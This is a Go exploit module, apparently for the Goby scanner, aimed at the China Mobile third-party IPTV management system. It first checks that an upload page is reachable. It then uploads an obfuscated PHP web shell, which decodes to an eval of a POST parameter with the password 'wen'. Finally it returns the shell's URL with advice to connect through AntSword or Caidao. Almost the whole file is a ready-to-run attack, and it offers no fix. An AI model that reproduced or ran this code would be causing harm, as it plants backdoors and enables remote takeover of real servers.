package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "China Mobile IPTV getshell",
    "Description": "This is the server used to manage third-party IPTV on demand. It has an arbitrary file upload vulnerability.",
    "Product": "China Mobile IPTV",
    "Homepage": "http://www.10086.cn/",
    "DisclosureDate": "2021-06-04",
    "Author": "internet",
    "GobyQuery": "title=\"中国移动第三方IPTV管理系统\"",
    "Level": "2",
    "Impact": "<p>webshell</p>",
    "Recommendation": "",
    "References": [
        "internet"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "China Mobile IPTV"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10213"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/ZHGXTV/index.php/Admin/Common/test"
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ">开始上传</button>")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			uri := "/ZHGXTV/index.php/admin/common/uploadfile.html"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false

			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryxcexPspczP3BiouN")
			cfg.Data = "\n\n\n------WebKitFormBoundaryxcexPspczP3BiouN\nContent-Disposition: form-data; name=\"file\"; filename=\"wen.php\"\nContent-Type: application/octet-stream\n\n<?php $mt=\"mFsKCleRfU\"; $ojj=\"IEBleldle\"; $hsa=\"E9TVFsnd2VuJ10p\"; $fnx=\"Ow==\"; $zk = str_replace(\"d\",\"\",\"sdtdrd_redpdldadcde\"); $ef = $zk(\"z\", \"\", \"zbazsze64_zdzeczodze\"); $dva = $zk(\"p\",\"\",\"pcprpepaptpe_fpupnpcptpipopn\"); $zvm = $dva('', $ef($zk(\"le\", \"\", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>\n------WebKitFormBoundaryxcexPspczP3BiouN--\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "true") {
					m := regexp.MustCompile(`"filePath":"(.*?)"`).FindStringSubmatch(resp.RawBody)
					if m != nil {
						expResult.Success = true
						filePath := strings.TrimLeft(strings.ReplaceAll(m[1], `\/`, `/`), "./")
						webshellUrl := expResult.HostInfo.FixedHostInfo + "/ZHGXTV/" + filePath
						expResult.Output = "webshell url: " + webshellUrl + "\n" + "password: wen\n" + "use AntSword or Caidao to connect"
					}

				}
			}

			return expResult
		},
	))
}
